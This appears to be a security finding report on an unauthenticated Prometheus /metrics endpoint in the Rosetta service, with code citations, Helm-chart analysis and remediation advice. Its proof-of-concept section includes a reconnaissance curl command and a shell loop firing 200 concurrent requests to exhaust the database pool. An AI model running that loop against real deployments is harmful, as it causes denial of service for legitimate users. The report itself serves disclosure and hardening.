### Title
Unauthenticated `/metrics` Endpoint Exposes Per-Route Latency Histograms in Rosetta Service

### Summary
The Rosetta service exposes its Prometheus `/metrics` endpoint with no authentication at the application layer, serving the full `hiero_mirror_rosetta_request_duration` histogram (buckets: 0.1, 0.25, 0.5, 1, 2.5, 5 seconds) labeled by `route`, `method`, `status_code`, and `ws`. Any caller that can reach the service port — including any pod in the cluster (network policy is disabled by default) or any external client if the port is exposed — can read cumulative bucket counts and derive approximate per-route p99 latencies, identifying which routes hold connections longest and are therefore the highest-value targets for resource-exhaustion attacks.

### Finding Description
**Exact code path:**

`rosetta/app/middleware/metrics.go`, `Routes()`, lines 64–73:
```go
func (c *metricsController) Routes() server.Routes {
    return server.Routes{
        {
            "metrics",
            "GET",
            metricsPath,           // "/metrics"
            promhttp.Handler().ServeHTTP,   // bare Prometheus handler, no auth wrapper
        },
    }
}
``` [1](#0-0) 

`promhttp.Handler()` is the default Prometheus HTTP handler with no authentication option. It is wired directly into the mux with no middleware guard.

The `requestDurationHistogram` registered in `init()` carries labels `{method, route, status_code, ws}`: [2](#0-1) 

In `rosetta/main.go`, `metricsController` is added to the router in both online and offline modes with no auth middleware applied before or after it: [3](#0-2) [4](#0-3) 

The middleware chain applied to the server is `MetricsMiddleware → TracingMiddleware → CorsMiddleware` — none of which authenticate the `/metrics` route: [5](#0-4) 

**Root cause / failed assumption:** The developer assumed the `/metrics` endpoint would be shielded by infrastructure (ingress path filtering, ClusterIP service type). There is no application-level authentication guard, unlike the REST API's `metricsHandler.js` which has an explicit `authenticate()` function gated on `config.metrics.config.authentication` (defaulting to `true`): [6](#0-5) 

**Infrastructure "mitigations" and why they are insufficient:**

1. The Helm chart ingress does not list `/rosetta/metrics` in its path rules, so the ingress does not route it externally. [7](#0-6) 

2. However, `networkPolicy.enabled` defaults to `false`, meaning no Kubernetes NetworkPolicy restricts intra-cluster access to the Rosetta pod: [8](#0-7) 

3. The service type is `ClusterIP`, but any pod in the cluster can reach it directly on the service's cluster IP and port 80 → app port 5700 with no credential requirement. [9](#0-8) 

**Exploit flow:**

A caller issues:
```
GET http://<rosetta-service>:<port>/metrics
```
The response includes lines such as:
```
hiero_mirror_rosetta_request_duration_bucket{application="rosetta",method="POST",route="/block/transaction",status_code="200",ws="false",le="5"} 412
hiero_mirror_rosetta_request_duration_bucket{application="rosetta",method="POST",route="/block/transaction",status_code="200",ws="false",le="+Inf"} 589
```
From these two values the attacker computes that ~30% of `/block/transaction` requests exceed 5 s (the highest bucket boundary), making it the highest-latency route. The attacker then floods that route with concurrent slow-body or keep-alive requests to exhaust the Go HTTP server's goroutine pool or the upstream database connection pool (`maxOpenConnections: 100`): [10](#0-9) 

The `requestInflightGauge` also leaks the current number of in-flight requests per route, letting the attacker time their burst to coincide with existing load. [11](#0-10) 

### Impact Explanation
- **Information disclosure**: Full per-route latency distribution, in-flight request counts, request/response byte sizes — all labeled by route — are readable without credentials.
- **Attack amplification**: The histogram directly identifies which routes are slowest (highest `+Inf` bucket ratio), allowing an attacker to concentrate resource-exhaustion payloads on the most effective targets rather than probing blindly.
- **Availability**: Targeted slowloris or connection-hold attacks against the identified slow routes can exhaust the database connection pool (capped at 100 open connections) or the Go HTTP server's goroutine budget, causing denial of service for all Rosetta API consumers.
- **Severity**: Medium–High (CVSS ~6.5). The primary harm is targeted DoS facilitation and operational intelligence leakage; no direct data exfiltration of user funds or keys occurs.

### Likelihood Explanation
- **Precondition**: Attacker must reach the Rosetta service port. This is trivially satisfied by any pod in the same Kubernetes cluster (network policy disabled by default) or by any external client if the operator has exposed the port directly (e.g., `kubectl port-forward`, NodePort, or LoadBalancer misconfiguration — all common in development and staging environments).
- **Skill required**: None beyond issuing a single HTTP GET. The Prometheus text format is self-documenting.
- **Repeatability**: The endpoint is always available and stateless; the attacker can poll it continuously to track latency trends in real time.
- **Detection difficulty**: A single unauthenticated GET to `/metrics` is indistinguishable from a legitimate Prometheus scrape in most logging configurations.

### Recommendation
1. **Immediate**: Wrap the `/metrics` handler with HTTP Basic Auth, mirroring the pattern already used in the REST API's `metricsHandler.js`. Add a configurable `metrics.authentication` flag to the Rosetta `application.yml` (defaulting to `true`) and a corresponding `promhttp.HandlerFor` call behind an auth-checking wrapper.
2. **Short-term**: Add a dedicated metrics port (e.g., 9090) separate from the API port (5700), and restrict it via a Kubernetes NetworkPolicy to only allow ingress from the Prometheus scraper pod's namespace/label selector.
3. **Helm chart**: Add `/rosetta/metrics` to an explicit deny rule in the ingress, or add a Traefik `ipWhiteList` middleware entry for the metrics path restricted to the monitoring namespace CIDR.
4. **Enable network policy**: Set `networkPolicy.enabled: true` in the common chart values and add a policy that restricts port 5700 ingress to only the ingress controller and Prometheus pods.

### Proof of Concept
```bash
# From any pod inside the cluster (no credentials needed):
curl -s http://<rosetta-service-clusterip>:5700/metrics \
  | grep 'hiero_mirror_rosetta_request_duration_bucket'

# Sample output (illustrative):
# hiero_mirror_rosetta_request_duration_bucket{...,route="/block/transaction",le="2.5"} 300
# hiero_mirror_rosetta_request_duration_bucket{...,route="/block/transaction",le="5"}   410
# hiero_mirror_rosetta_request_duration_bucket{...,route="/block/transaction",le="+Inf"} 590
#
# => ~30% of /block/transaction requests exceed 5 s → highest-latency route identified.

# Derive approximate p99 via linear interpolation between buckets:
# p99 ≈ 2.5 + (5-2.5) * ((0.99*590 - 300) / (410 - 300)) ≈ 4.8 s

# Targeted resource exhaustion (slowloris-style) against identified route:
for i in $(seq 1 200); do
  curl -s -X POST http://<rosetta-service-clusterip>:5700/block/transaction \
    -H "Content-Type: application/json" \
    -d '{"network_identifier":{"blockchain":"Hiero","network":"mainnet"},"block_identifier":{"index":1}}' \
    --max-time 30 &
done
# Exhausts the 100-connection DB pool, causing 503s for all other callers.
```

### Citations

**File:** rosetta/app/middleware/metrics.go (L28-32)
```go
	requestDurationHistogram = prometheus.NewHistogramVec(prometheus.HistogramOpts{
		Name:    "hiero_mirror_rosetta_request_duration",
		Buckets: []float64{.1, .25, .5, 1, 2.5, 5},
		Help:    "Time (in seconds) spent serving HTTP requests.",
	}, []string{"method", "route", "status_code", "ws"})
```

**File:** rosetta/app/middleware/metrics.go (L34-37)
```go
	requestInflightGauge = prometheus.NewGaugeVec(prometheus.GaugeOpts{
		Name: "hiero_mirror_rosetta_request_inflight",
		Help: "Current number of inflight HTTP requests.",
	}, []string{"method", "route"})
```

**File:** rosetta/app/middleware/metrics.go (L64-73)
```go
func (c *metricsController) Routes() server.Routes {
	return server.Routes{
		{
			"metrics",
			"GET",
			metricsPath,
			promhttp.Handler().ServeHTTP,
		},
	}
}
```

**File:** rosetta/main.go (L106-119)
```go
	metricsController := middleware.NewMetricsController()
	if err != nil {
		return nil, err
	}

	return server.NewRouter(
		networkAPIController,
		blockAPIController,
		mempoolAPIController,
		constructionAPIController,
		accountAPIController,
		healthController,
		metricsController,
	), nil
```

**File:** rosetta/main.go (L148-152)
```go
	metricsController := middleware.NewMetricsController()
	networkAPIService := services.NewNetworkAPIService(baseService, nil, network, version)
	networkAPIController := server.NewNetworkAPIController(networkAPIService, asserter)

	return server.NewRouter(constructionAPIController, healthController, metricsController, networkAPIController), nil
```

**File:** rosetta/main.go (L217-219)
```go
	metricsMiddleware := middleware.MetricsMiddleware(router)
	tracingMiddleware := middleware.TracingMiddleware(metricsMiddleware)
	corsMiddleware := server.CorsMiddleware(tracingMiddleware)
```

**File:** rest/middleware/metricsHandler.js (L137-144)
```javascript
const authenticate = (req) => {
  const {authentication, username, password} = config.metrics.config;
  if (!authentication) {
    return true;
  }
  const credentials = basicAuth(req);
  return credentials && tsscmp(credentials.name, username) && tsscmp(credentials.pass, password);
};
```

**File:** charts/hedera-mirror-rosetta/values.yaml (L121-134)
```yaml
    traefik.ingress.kubernetes.io/router.middlewares: '{{ include "hedera-mirror-rosetta.namespace" . }}-{{ include "hedera-mirror-rosetta.fullname" . }}@kubernetescrd'
  enabled: true
  hosts:
    - host: ""
      paths:
        - "/rosetta/account"
        - "/rosetta/block"
        - "/rosetta/call"
        - "/rosetta/construction"
        - "/rosetta/events"
        - "/rosetta/mempool"
        - "/rosetta/network"
        - "/rosetta/search"
  tls:
```

**File:** charts/hedera-mirror-rosetta/values.yaml (L263-266)
```yaml
service:
  annotations: {}
  port: 80
  type: ClusterIP
```

**File:** charts/hedera-mirror-common/values.yaml (L217-218)
```yaml
networkPolicy:
  enabled: false
```

**File:** docs/configuration.md (L660-660)
```markdown
| `hiero.mirror.rosetta.db.pool.maxOpenConnections` | 100                 | The maximum number of open database connections                                                     |
```
